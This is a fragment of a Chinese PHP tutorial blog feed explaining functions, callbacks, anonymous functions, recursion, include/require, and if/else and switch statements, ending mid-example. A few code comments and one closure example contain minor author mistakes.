id="没有默认参数的函数"><a href="#没有默认参数的函数" class="headerlink" title="没有默认参数的函数"></a>没有默认参数的函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function test($name, $sex, $age)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;我的名字叫：&quot;.$name.&quot; 性别：&quot;.$sex. &quot; 年龄：&quot;.$age.&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">test();     &#x2F;&#x2F;报错必须指定三个参数值</span><br><span class="line">test(&quot;王麻子2&quot;,&quot;女&quot;,&quot;16&quot;); &#x2F;&#x2F;输出我的名字叫：王麻子2 性别：女 年龄：16</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020102109.png" alt="image"></p><h3 id="可变个数参数的函数"><a href="#可变个数参数的函数" class="headerlink" title="可变个数参数的函数"></a>可变个数参数的函数</h3><p>通常用户定义函数时，设置的参数数量是有限的。如果希望函数可以接受任意数量的参数，需使用以下函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">func_get_args()  &#x2F;&#x2F;返回一个数组，包含所有参数</span><br><span class="line">func_num_args()  &#x2F;&#x2F;返回参数总数 </span><br><span class="line">func_get_arg()    &#x2F;&#x2F;接收一个数组下标，返回指定数组下标的值</span><br></pre></td></tr></table></figure><h4 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h4><p>声明一个函数<code>more_args()</code>，用于打印参数列表的值<br>虽然没有声明参数列表，但可以传入任意个数，任意类型的参数值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function more_args() &#123;           </span><br><span class="line">    $args &#x3D; func_get_args();          &#x2F;&#x2F;将所有传递给脚本函数的参数当做一个数组返回</span><br><span class="line">    for($i&#x3D;0; $i&lt;count($args); $i++) &#123;               &#x2F;&#x2F;使用for循环遍历数组$args</span><br><span class="line">        echo &quot;第&quot;.$i.&quot;个参数是&quot;.$args[$i].&quot;&lt;br&gt;&quot;;    &#x2F;&#x2F;分别输出传入函数的每个参数</span><br><span class="line">    &#125;</span><br><span class="line">    var_dump(func_get_arg(3));  &#x2F;&#x2F;输出一次$args数组中下标为3的参数</span><br><span class="line">&#125;</span><br><span class="line">more_args(&quot;one&quot;, &quot;two&quot;, &quot;three&quot;, 1, 2, 3, 4);           &#x2F;&#x2F;调用函数并输入多个参数</span><br></pre></td></tr></table></figure><p>页面返回结果：</p><p><img src="https://qiniu.hzktester.top/tp2020102110.png" alt="image"></p><h4 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h4><p>直接使用<code>func_num_args()</code>函数得到数组的总数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function more_args() &#123;           </span><br><span class="line">    for($i&#x3D;0; $i&lt;func_num_args(); $i++) &#123;            &#x2F;&#x2F;使用for循环遍历数组$args</span><br><span class="line">        echo &quot;第&quot;.$i.&quot;个参数是&quot;.func_get_arg($i).&quot;&lt;br&gt;&quot;;&#x2F;&#x2F;分别输出传入函数的每个参数</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">more_args(&quot;one&quot;, &quot;two&quot;, &quot;three&quot;, 1, 2, 3);           &#x2F;&#x2F;调用函数并输入多个参数</span><br></pre></td></tr></table></figure><p>返回结果和示例1一致</p><h3 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h3><p>所谓回调函数，就是指调用函数时并不是传递一个标准的变量作为参数，而是<strong>将另一函数作为参数传递到调用的函数中</strong>。</p><h4 id="变量回调函数"><a href="#变量回调函数" class="headerlink" title="变量回调函数"></a>变量回调函数</h4><h5 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;** 声明第一个函数one, 计算两个数的和</span><br><span class="line">    @param  int $a  计算和的第一个运算元</span><br><span class="line">    @param  int $b  计算和的第二个运算元</span><br><span class="line">    @return int     返回计算后的结果</span><br><span class="line">*&#x2F;</span><br><span class="line">function one( $a, $b ) &#123;</span><br><span class="line">    return $a + $b;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;** 声明第二个函数two, 计算两个数的平方和</span><br><span class="line">*&#x2F;</span><br><span class="line">function two($a, $b) &#123;</span><br><span class="line">    return $a*$b + $b*$b;</span><br><span class="line">&#125;   </span><br><span class="line">$result &#x3D; &quot;one&quot;;   &#x2F;&#x2F;将函数名&quot;one&quot;赋给变量$result, 执行$result()时则调用函数one()</span><br><span class="line">&#x2F;&#x2F; $result &#x3D; &quot;two&quot;; &#x2F;&#x2F;将函数名&quot;two&quot;赋给变量$result, 执行$result()时则调用函数two()</span><br><span class="line">echo &quot;运算结果是：&quot;.$result(2, 3);    &#x2F;&#x2F;变量$result的函数名值是哪个，就调用哪个函数</span><br></pre></td></tr></table></figure><h5 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h5><p>声明回调函数<code>filter</code>, 在<code>0-100</code>的整数中通过自定义条件过滤不要的数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function filter( $fun ) &#123;</span><br><span class="line">    for($i&#x3D;0; $i &lt;&#x3D; 100; $i++) &#123;</span><br><span class="line">        &#x2F;&#x2F;将参数变量$fun加上一个圆插号$fun(), 则为调用和变量$fun值同名的函数</span><br><span class="line">        if( $fun($i) ) </span><br><span class="line">             continue;   </span><br><span class="line">        echo $i.&#39;&lt;br&gt;&#39;; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;声明一个函数one, 如果参数是3的倍数就返回true, 否则返回false</span><br><span class="line">function one($num) &#123;</span><br><span class="line">    return $num%3 !&#x3D; 0;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 声明一个函数two, 如果参数是一个回文数(翻转后还等于自己的数)返回true, 否则返回false</span><br><span class="line">function two($num) &#123;</span><br><span class="line">    return $num%7 !&#x3D; 0;</span><br><span class="line">&#125;</span><br><span class="line">filter(&quot;one&quot;);      &#x2F;&#x2F;打印出100以内3的倍数，参数&quot;one&quot;是函数one()的名称字符串，是一个回调</span><br><span class="line">echo &#39;--------------------&lt;br&gt;&#39;;</span><br><span class="line">filter(&#39;two&#39;);      &#x2F;&#x2F;打印出100以内7的倍数，参数&quot;two&quot;是函数two()的名称字符串，是一个回调</span><br></pre></td></tr></table></figure><p>页面返回结果：</p><p><img src="https://qiniu.hzktester.top/tp2020102111.png" alt="image"></p><h4 id="类静态函数和对象的方法回调"><a href="#类静态函数和对象的方法回调" class="headerlink" title="类静态函数和对象的方法回调"></a>类静态函数和对象的方法回调</h4><p>借助<code>call_user_func_array()</code>函数自定义回调函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 声明一个类Demo,类中声明一个静态的成员方法fun() *&#x2F;</span><br><span class="line">class Demo &#123;</span><br><span class="line">    static function fun($msg1, $msg2) &#123;</span><br><span class="line">        echo &#39;$msg1 &#x3D; &#39;.$msg1;</span><br><span class="line">        echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">        echo &#39;$msg2 &#x3D; &#39;.$msg2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;* 声明一个类Test, 类中声明一个普通的成员方法fun()  *&#x2F;</span><br><span class="line">class Test &#123;</span><br><span class="line">    function fun($msg1, $msg2) &#123;</span><br><span class="line">        echo &#39;$msg1 &#x3D; &#39;.$msg1;</span><br><span class="line">        echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">        echo &#39;$msg2 &#x3D; &#39;.$msg2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">call_user_func_array( array(&quot;Demo&quot;, &#39;fun&#39;), array(&#39;LAMP&#39;, &#39;兄弟连&#39;) );</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">echo &#39;&lt;br&gt;&#39;;</span><br><span class="line">call_user_func_array( array(new Test(), &#39;fun&#39;), array(&#39;BroPHP&#39;, &#39;学习型PHP框架&#39;) );</span><br></pre></td></tr></table></figure><p>页面返回结果：</p><p><img src="https://qiniu.hzktester.top/tp2020102112.png" alt="image"></p><h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><p>匿名函数<code>Anonymous functions</code>，也叫闭包函数<code>closures</code>，允许 临时创建一个没有指定名称的函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$greet &#x3D; function($name)&#123;</span><br><span class="line">echo (&quot;Hello %s\r\n&quot;, $name);</span><br><span class="line">&#125;</span><br><span class="line">$greet(&#39;World&#39;);    &#x2F;&#x2F;输出 Hello World</span><br><span class="line">$greet(&#39;PHP&#39;);      &#x2F;&#x2F;输出 Hello PHP</span><br></pre></td></tr></table></figure><h3 id="递归函数"><a href="#递归函数" class="headerlink" title="递归函数"></a>递归函数</h3><ul><li>所谓的函数递归调用，就是函数<strong>可以在其声明的执行叙述之中调用执行自己</strong>。</li><li>通常在此类型的函数之中会<strong>附加一个条件判断叙述</strong>，以判断是否需要执行递归调用，并且<strong>在特定条件下终止函数的递归调用动作</strong>，把目前流程的主控权交回上一层函数执行。因此当某个执行递归调用的函数，<strong>没有附加条件判断叙述时可能会造成无限循环的错误情形</strong>.</li><li>函数递归调用最大的好处在于<strong>可以精简程序中繁杂重复调用程序</strong>，并且能以这种特性来<strong>执行一些较为复杂的运算动作</strong>。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line">    声明一个名称为test的函数，用于测试递归</span><br><span class="line">    $param  int $n  需要一个整数作为参数</span><br><span class="line">*&#x2F;</span><br><span class="line">function test( $n ) &#123;             &#x2F;&#x2F;声明一个名为test的函数，有一个参数</span><br><span class="line">    echo $n.&quot;&amp;nbsp;&amp;nbsp;&quot;; &#x2F;&#x2F;在函数开始处输出参数的值和两个空格</span><br><span class="line">    </span><br><span class="line">    if($n&gt;0)                            &#x2F;&#x2F;判断参数是否大于0</span><br><span class="line">        test($n-1);                    &#x2F;&#x2F;如果参数大于0则调用自己，并将参数减1后再传入</span><br><span class="line">    else                                  &#x2F;&#x2F;判断参数不大于0</span><br><span class="line">        echo &quot; &lt;--&gt; &quot;;                &#x2F;&#x2F;输出分界字符串</span><br><span class="line">        </span><br><span class="line">    echo $n.&quot;&amp;nbsp;&amp;nbsp;&quot;; &#x2F;&#x2F;在函数结束处输出参数的值和两个空格</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test(10);</span><br></pre></td></tr></table></figure>页面返回结果：</li></ul><p><img src="https://qiniu.hzktester.top/tp2020102113.png" alt="image"></p><h3 id="调用自定义函数库"><a href="#调用自定义函数库" class="headerlink" title="调用自定义函数库"></a>调用自定义函数库</h3><p>通过重复使用已有的代码，提高开发效率，降低成本</p><h4 id="include-和require-函数"><a href="#include-和require-函数" class="headerlink" title="include()和require()函数"></a>include()和require()函数</h4><p><code>include()</code>与<code>require ()</code>几乎等价，区别在于在脚本执行时包含，当处理失败时，<code>include()</code>产生一个警告而<code>require()</code>则导致一个致命错误。</p><h5 id="使用include-引入不存在的文件"><a href="#使用include-引入不存在的文件" class="headerlink" title="使用include()引入不存在的文件"></a>使用include()引入不存在的文件</h5><p>如果文件引用失败，那么就报警告错误还是会执行后面的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include &quot;tests.php&quot;;</span><br><span class="line">echo &quot;1&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020102114.png" alt="image"></p><h5 id="使用require-引入不存在的文件"><a href="#使用require-引入不存在的文件" class="headerlink" title="使用require()引入不存在的文件"></a>使用require()引入不存在的文件</h5><p>如果文件引用失败,那么就直接终止程序，不会执行后面的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">require &quot;tests.php&quot;;</span><br><span class="line">echo &quot;1&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020102115.png" alt="image"></p><h4 id="include-once-和require-once-函数"><a href="#include-once-和require-once-函数" class="headerlink" title="include_once()和require_once()函数"></a>include_once()和require_once()函数</h4><p>两个函数在脚本执行期间包括并运行指定文件。与<code>include()</code>语句及<code>require()</code>类似，唯一区别是<strong>如果该文件中的代码已经被包括了，则不会再次包括，只会包括一次</strong>。这两个函数应该用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p><p>同目录下有一个<code>test.php</code>文件，内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;test &lt;br&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h5 id="示例1：-1"><a href="#示例1：-1" class="headerlink" title="示例1："></a>示例1：</h5><p>使用<code>include()</code>函数调用<code>test.php</code>文件多次。输出4次<code>test</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include &quot;test.php&quot;;</span><br><span class="line">include &quot;test.php&quot;;</span><br><span class="line">include &quot;test.php&quot;;</span><br><span class="line">include &quot;test.php&quot;;</span><br></pre></td></tr></table></figure><h5 id="示例2：-1"><a href="#示例2：-1" class="headerlink" title="示例2："></a>示例2：</h5><p>使用<code>include_once()</code>函数和<code>require_once()</code>调用<code>test.php</code>文件多次。只输出一次<code>test</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">include_once &quot;test.php&quot;;</span><br><span class="line">include_once &quot;test.php&quot;;</span><br><span class="line">include_once &quot;test.php&quot;;</span><br><span class="line">include_once &quot;test.php&quot;;</span><br><span class="line">require_once &quot;test.php&quot;;</span><br><span class="line">require_once &quot;test.php&quot;;</span><br><span class="line">require_once &quot;test.php&quot;;</span><br><span class="line">require_once &quot;test.php&quot;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;函数的定义&quot;&gt;&lt;a href=&quot;#函数的定义&quot; class=&quot;headerlink&quot; title=&quot;函数的定义&quot;&gt;&lt;/a&gt;函数的定义&lt;/h2&gt;&lt;p&gt;函数&lt;code&gt;function&lt;/code&gt;是一段完成指定任务的已命名代码块。函数可以遵照给它的一组值或参数完成特定的任务，并且可能返回一个值。在&lt;code&gt;PHP&lt;/code&gt;中有两种函数：&lt;strong&gt;自定义函数与系统函数&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;函数的优点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;控制程序设计的复杂性&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;提高软件的可靠性&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;提高软件的开发效率&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;提高软件的可维护性&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;提高程序的重用性&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;自定义函数&quot;&gt;&lt;a href=&quot;#自定义函数&quot; class=&quot;headerlink&quot; title=&quot;自定义函数&quot;&gt;&lt;/a&gt;自定义函数&lt;/h2&gt;&lt;h3 id=&quot;自定义函数语法格式：&quot;&gt;&lt;a href=&quot;#自定义函数语法格式：&quot; class=&quot;headerlink&quot; title=&quot;自定义函数语法格式：&quot;&gt;&lt;/a&gt;自定义函数语法格式：&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;function  函数名称([参数1 [,参数2 [,…]]])&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	程序内容叙述(也叫函数体);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	[return 返回值;] &amp;#x2F;&amp;#x2F;如需函数有返回值时使用&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;函数的使用：&quot;&gt;&lt;a href=&quot;#函数的使用：&quot; class=&quot;headerlink&quot; title=&quot;函数的使用：&quot;&gt;&lt;/a&gt;函数的使用：&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;函数名称([参数1 [,参数2 [,…]]]);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;自定义函数的名称：&quot;&gt;&lt;a href=&quot;#自定义函数的名称：&quot; class=&quot;headerlink&quot; title=&quot;自定义函数的名称：&quot;&gt;&lt;/a&gt;自定义函数的名称：&lt;/h3&gt;</summary>
    
    
    
    <category term="PHP基础" scheme="https://hzktester.top/categories/PHP%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="PHP基础" scheme="https://hzktester.top/tags/PHP%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>流程控制语句、分支、循环</title>
    <link href="https://hzktester.top/posts/208f6916.html"/>
    <id>https://hzktester.top/posts/208f6916.html</id>
    <published>2020-10-21T03:46:00.000Z</published>
    <updated>2020-10-21T05:15:57.548Z</updated>
    
    <content type="html"><![CDATA[<h2 id="流程控制概述"><a href="#流程控制概述" class="headerlink" title="流程控制概述"></a>流程控制概述</h2><ul><li>任何 <code>PHP</code> 脚本都是由一系列语句构成的。一条语句可以是一个赋值语句，一个函数调用，一个循环，甚至一个什么也不做的（空语句）条件语句。语句通常以分号结束。此外，还可以用花括号将一组语句封装成一个语句组。语句组本身可以当作是一行语句。</li><li>在任何一门程序设计语言中，都需要支持满足程序结构化所需要的三种基本结构:<ul><li><strong>顺序结构</strong></li><li><strong>分支结构（选择结构）</strong></li><li><strong>循环结构</strong></li></ul></li></ul><h2 id="分支结构"><a href="#分支结构" class="headerlink" title="分支结构"></a>分支结构</h2><h3 id="单一条件分支结构-if"><a href="#单一条件分支结构-if" class="headerlink" title="单一条件分支结构(if)"></a>单一条件分支结构(if)</h3><p>当条件表达式的值为真<code>true</code>时，<code>PHP</code>将执行语句组，相反条件表达式的值为假<code>false</code>时，<code>PHP</code>将不执行语句组，忽略语句组执行下面的语句。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a&#x3D;5;</span><br><span class="line">$b&#x3D;3;</span><br><span class="line">    if ($a &gt; $b)</span><br><span class="line">        echo &quot;a &gt; b&quot;; &#x2F;&#x2F;如果变量a的值大于b的值则会输出：a大于b</span><br><span class="line">    </span><br><span class="line">    $x&#x3D;10;</span><br><span class="line">    $y&#x3D;20;</span><br><span class="line">    if($x&lt;$y)&#123;          &#x2F;&#x2F;判断是否x小于y。多条语句需要使用&#123; &#125;括起来。</span><br><span class="line">         $t&#x3D;$x;</span><br><span class="line">         $x&#x3D;$y;</span><br><span class="line">         $y&#x3D;$t;</span><br><span class="line">    &#125;</span><br><span class="line">    var_dump($x&gt;$y);  &#x2F;&#x2F;输出：bool(true)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="双向条件分支结构-else从句"><a href="#双向条件分支结构-else从句" class="headerlink" title="双向条件分支结构(else从句)"></a>双向条件分支结构(else从句)</h3><p><code>if-else</code> 条件判断与 <code>if</code> 条件判断类似，所不同的是，<code>if-else</code> 语<br>句的条件表达式值为真<code>true</code>时，会执行 <code>if</code> 的本体语句<strong>语句组1</strong>，<br>而条件表达式值为假<code>false</code>时，则执行 <code>else</code> 的本体语句<strong>语句组2</strong>。</p><p><img src="https://qiniu.hzktester.top/tp2020102101.png" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(false)&#123;  &#x2F;&#x2F; 真区间</span><br><span class="line">echo 1;</span><br><span class="line">&#125; else &#123;    &#x2F;&#x2F; 假区间</span><br><span class="line">echo 2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="多向条件分支结构-else-if子句"><a href="#多向条件分支结构-else-if子句" class="headerlink" title="多向条件分支结构(else if子句)"></a>多向条件分支结构(else if子句)</h3><p><img src="https://qiniu.hzktester.top/tp2020102102.png" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    date_default_timezone_set(&quot;Etc&#x2F;GMT-8&quot;);       &#x2F;&#x2F;设置时区，中国大陆采用东八区的时间</span><br><span class="line">    echo &quot;当前时间&quot;.date(&quot;Y-m-d H:i:s&quot;,time()).&quot; &quot;; &#x2F;&#x2F;通过date()函数获取当前时间，并输出</span><br><span class="line">    </span><br><span class="line">    $hour &#x3D; date(&quot;H&quot;);              &#x2F;&#x2F;获取服务器时间中当前的小时，作为分时问候的条件</span><br><span class="line">    if( $hour &lt; 6 ) &#123;                     &#x2F;&#x2F;如果当前时间在6点以前，执行下面的语句块</span><br><span class="line">        echo &quot;凌晨好!&quot;;</span><br><span class="line">    &#125; else if ( $hour &lt; 9 ) &#123;           &#x2F;&#x2F;如果当前时间在6点之后和9点以前，执行下面的语句块</span><br><span class="line">        echo &quot;早上好!&quot;;</span><br><span class="line">    &#125; else if ( $hour &lt; 12 ) &#123;         &#x2F;&#x2F;如果当前时间在9点之后和12点以前，执行下面的语句块</span><br><span class="line">        echo &quot;上午好!&quot;;</span><br><span class="line">    &#125; else if ( $hour &lt; 14 ) &#123;         &#x2F;&#x2F;如果当前时间在12点之后和14点以前，执行下面的语句块</span><br><span class="line">        echo &quot;中午好!&quot;;</span><br><span class="line">    &#125; else if ( $hour &lt; 17 ) &#123;          &#x2F;&#x2F;如果当前时间在14点之后和17点以前，执行下面的语句块</span><br><span class="line">        echo &quot;下午好!&quot;;</span><br><span class="line">    &#125; else if ( $hour &lt; 19 ) &#123;          &#x2F;&#x2F;如果当前时间在17点之后和19点以前，执行下面的语句块</span><br><span class="line">        echo &quot;傍晚好!&quot;;</span><br><span class="line">    &#125; else if ( $hour &lt; 22 ) &#123;          &#x2F;&#x2F;如果当前时间在19点之后和22点以前，执行下面的语句块</span><br><span class="line">        echo &quot;晚上好!&quot;;</span><br><span class="line">    &#125; else &#123;                                  &#x2F;&#x2F;如果当前时间在22点之后和次日1点以前，执行下面语句块</span><br><span class="line">        echo &quot;夜里好!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="多向条件分支结构-switch语句"><a href="#多向条件分支结构-switch语句" class="headerlink" title="多向条件分支结构(switch语句)"></a>多向条件分支结构(switch语句)</h3><p>当程序执行碰到<code>switch</code>条件判断时，它会取出键值，然后与语句体中的<code>case</code>所列出的值逐一比较，如果数值不符合，则将数值往下一个<code>case</code>传递，如果数值符合，则执行<code>case</code>中的语句，然后再碰到<code>break</code>语句即跳出<code>switch</code>条件判断，如果所有的值比对都不符合，则会执行<code>default</code>中的语句 。</p><p><img src="https://qiniu.hzktester.top/tp2020102103.png" alt="image"></p><p><code>switch</code>语句使用注意事项:</p><ul><li><code>switch</code>语句与<code>if</code>语句不同，它仅能判断一种关系：<strong>是否恒等</strong>。 </li><li><code>switch</code>语句中<code>case</code>子句的常量可以是整型常量、字符型常量、表达式或变量。</li><li>在同一个<code>switch</code>中，<code>case</code>子句的常量不能相同，否则第二个值永远无法匹配到。</li><li><code>case</code> 和 <code>default</code> 子句后面的语句序列允许由多个可执行语句组成，且不必用<code>｛ ｝</code>括起来，也可以为空语句。</li><li><code>switch</code>语句中可省略<code>break</code>语句和<code>default</code>子句。但省略后会改变流程。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">date_default_timezone_set(&quot;Etc&#x2F;GMT-8&quot;);&#x2F;&#x2F;设置时区，中国大陆采用东八区的时间</span><br><span class="line">    $week &#x3D; date(&quot;D&quot;);   &#x2F;&#x2F;获取当前星期几</span><br><span class="line">    switch( $week ) &#123;</span><br><span class="line">        case &quot;Mon&quot;: echo &quot;星期一&quot;;  break;                </span><br><span class="line">        case &quot;Tue&quot;: echo &quot;星期二&quot;;  break;                    </span><br><span class="line">        case &quot;Wed&quot;: echo &quot;星期三&quot;;  break;                    </span><br><span class="line">        case &quot;Thu&quot;: echo &quot;星期四&quot;;  break;              </span><br><span class="line">        case &quot;Fri&quot;: echo &quot;星期五&quot;;  break;           </span><br><span class="line">        case 